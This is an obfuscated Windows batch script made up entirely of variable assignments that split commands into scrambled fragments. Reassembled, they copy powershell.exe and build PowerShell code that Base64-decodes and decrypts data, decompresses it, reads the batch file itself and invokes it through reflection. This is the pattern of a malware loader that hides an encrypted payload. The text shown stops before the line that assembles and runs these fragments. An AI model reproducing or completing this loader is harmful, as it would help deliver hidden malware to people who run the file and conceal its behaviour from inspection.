@echo off
set "IQmqbuMNxZ= C"
set "JRvCdAbTFS=he"
set "KABohkuTjr=we"
set "vbWAHPbTYg=s\"
set "kdExsLdcjL=\v"
set "FhPSjjRvhb=ll"
set "XYngIFXNPD=ws"
set "UBETHIGWGy=st"
set "esqhxOUykf=em"
set "aEwfmqdQeB=.e"
set "sFfBtaJRor=do"
set "xZJTiVSTbO=we"
set "QzvCsUxcTZ=\W"
set "ddiDFHrxxR=:\"
set "XYGhUNyuss=py"
set "QQZSVGNQSE=nd"
set "JyznoSfZkG=1."
set "QZxJeRReVq=xe"
set "urhqHxwZYx=ll"
set "ORiulFnXjs=po"
set "StgzzJjctG=y "
set "kclSMUPdBn=ow"
set "rRElWAGrKY=Po"
set "FTRMFpKHJz=32"
set "ZUsDjmeqHY=Sy"
set "xZgUZWPJRQ=co"
set "FMRsikHVjg= /"
set "jenAbGEkgu=in"
set "KSPssUvRuT=Wi"
set "sxOspJPnAA=rs"
set "kFOBbkQhSw=rS"
set "nFiFXSqfbI=he"
set "iAoqXSxxUE=0\"
set "aPkECEUYxB= %~dp0"
set "ckoqBuCuCh=cd"
set "WzpHWJYYfv=Disp"
set "xTFDAAfgrY=ew-O"
set "yHrlNwxuRc=gnir"
set "yrOJqPEOGz=ion."
set "eMfEWxICyU=B.Su"
set "uofxEtCPPA=yste"
set "ztiqhcGKZI=saBm"
set "sbtXziMLAE=ypto"
set "cJaMJDDKPP=rofi"
set "OCNIueBKqw=UuMP"
set "RcfxyfVrXI=xO ="
set "hxZqXXsgBh=ionM"
set "UmndhPvOgX=$mQR"
set "AtDXsUMJwv=T = "
set "ciAvslttLA=6esa"
set "gqYJDkHHLj=.Con"
set "CAerhIljYN=);$k"
set "CUkryFtcaE=raph"
set "RrCrKDkqMb=)($m"
set "qnQgGkJFPT=;$ou"
set "chwblofHDd=n ''"
set "gqjussoemF=gth)"
set "sOFKMUJbgs=oryS"
set "weJLjNTWib= = ["
set "QtBTXXyuuw=dj0C"
set "aEKbxZKWAl=..-1"
set "oKKJfgtcMh=New-"
set "nTgOBydrDZ= = N"
set "pCssAvKDLb=tsWi"
set "DxxagHEcpd=, $m"
set "QqIVwhsIRl=Stre"
set "HXMzUtnZtX=kwuG"
set "jfewpdAYov=bjec"
set "xZObnqYjmj=QRgT"
set "WYuNgQuXSY=y.Pa"
set "RaFaJHQxKu=yTo("
set "KmeNGXYiAH=CGip"
set "IEiZEzQjiZ=.Com"
set "EshdEjwTnd=th('"
set "HutcuEmiJX=rity"
set "RHKVkJoLMW=ispo"
set "NWcdeJDEvx=);$o"
set "CqfiRAuRZL=[]] "
set "XIlBVIklSw=File"
set "EKIbmTfrdV=$UuM"
set "sUXEXdUwIF=]::("
set "hRJLupWoep=:('g"
set "XRebnoKUVn= [st"
set "jDqBfoHNsE=Fina"
set "ffiUERMwgw=PTtG"
set "lOtKSABWQW=rlD."
set "yDDgDXRjzg=rans"
set "BskuhsNExb=ct S"
set "fflFaZJSak= New"
set "AubxEUwjQL=em.I"
set "mckToCWqLX=-joi"
set "kFEfRLtEbs=raph"
set "BdtlaWeFAT=();$"
set "ahMFRzOnFW=bstr"
set "hBygdvQrlZ=ip.D"
set "BaFnBFFxTQ= [Sy"
set "fWGVHMyxZX=-Obj"
set "phPRXhNHse=Comp"
set "MWeyPFAZGw=ke($"
set "ZMfuijheKN=tem."
set "QqsIJUcmlw= '')"
set "vtqFObuAbZ=zuZI"
set "HrcfQcEKmS=wuGU"
set "byHKXQpeKN=ne);"
set "qeQVBFVXpZ=T, 0"
set "hgvkPMbEQm=L4Yi"
set "LhLToNwuGX=xO);"
set "bnvvulZPKn=)) {"
set "ZrlyBVzqBM=.Mem"
set "kwIKLJqmBa=ress"
set "JmsDMoCZGy=('%~f0'"
set "lWnGDZJXeR=l5E7"
set "ZzFbaItLdD=3); "
set "oGjtbzgKbP=$kwu"
set "svhUpqvYxK=($rs"
set "kVQhoKtfuX=U.Pa"
set "mRwhfLtpsB=gT ="
set "aSaiOpdyIv=NkB "
set "jMoMenuZEQ=.Dis"
set "akxzHvpcjX=)($I"
set "IXoZxHnfCn=ptog"
set "lHjqsTHEpt=-joi"
set "OEESXAkSce=SOfe"
set "sGnFbOChqf=$out"
set "JrSoWBbidd= = $"
set "DvigNwOBQT=eam("
set "uPrAqwalmL=:: '"
set "XTATQDDjSo=Comp"
set "ObnuTchEhx=pStr"
set "rENuyjwTSc=('%*'"
set "zZwnoPsYru=7;$k"
set "OXswjyoaZP=).Sp"
set "qviUhahPAR=nirt"
set "XXLKInPTrs=rtS4"
set "cdPQUBCLFi=; };"
set "zXxiVSUvYB=.Dis"
set "vPYdRahuhi=join"
set "zBfWHxXrLn=();$"
set "xMwbeBghKd= '')"
set "vVrhOLKLhH=Disp"
set "gxflaFClur=pose"
set "PiGTbayLmd=gjYA"
set "PdIvBqXLVp=]::N"
set "aAUgrTcPyp=null"
set "gaqzcPZbTQ=yste"
set "VPYYtCEeCb=cfn "
set "LRrvTaHtlZ=ecry"
